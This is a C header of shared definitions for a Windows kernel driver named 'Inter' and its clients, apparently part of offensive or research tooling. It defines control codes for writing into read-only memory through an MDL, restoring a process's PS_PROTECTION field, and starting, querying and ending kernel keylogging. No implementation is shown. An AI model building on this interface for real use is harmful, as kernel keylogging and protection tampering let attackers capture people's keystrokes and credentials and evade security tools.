#pragma once

/*
	Common definitions to the driver and its clients
*/

#define DRIVER_NAME L"Inter"
#define DEVICE_NAME L"\\Device\\" DRIVER_NAME
#define SYMLINK_NAME L"\\??\\" DRIVER_NAME

/*
	Copy to readonly memory using MDL
*/
#define IOCTL_COPY_TO_MEMORY CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

/*
	Restore the PS_PROTECTION field of the process
*/
#define IOCTL_RESTORE_PROTECTION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

struct CopyToMemoryParams {
	PVOID Dest;
	PVOID Source;
	size_t Length;
};

/*
	Starts keylogging.
*/
#define IOCTL_START_KEYLOGGING CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

/*
	Queries logged keys.
*/
#define IOCTL_QUERY_KEYLOGGING CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

/*
	Ends keylogging session.
*/
#define IOCTL_END_KEYLOGGING CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
